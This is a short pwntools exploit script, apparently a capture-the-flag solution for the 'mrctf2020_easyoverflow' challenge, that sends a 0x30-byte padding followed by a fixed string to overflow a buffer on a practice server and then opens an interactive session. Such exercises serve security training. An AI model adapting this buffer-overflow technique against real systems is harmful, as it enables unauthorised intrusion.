#+++++++++++++++++++exp.py++++++++++++++++++++
# -*- coding:utf-8 -*-                           
#Author: Squarer
#Time: Sun Nov 15 11:59:38 CST 2020
#+++++++++++++++++++exp.py++++++++++++++++++++
from pwn import*

#context.log_level = 'debug'
context.arch = 'amd64'

elf = ELF('./mrctf2020_easyoverflow')
#libc = ELF('null')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')

sh = process('mrctf2020_easyoverflow')
sh = remote('node3.buuoj.cn',27015)

payload = 'A'*0x30
payload += 'n0t_r3@11y_f1@g'
#gdb.attach(sh,'b*$rebase(0x868)')
sh.sendline(payload)



sh.interactive()
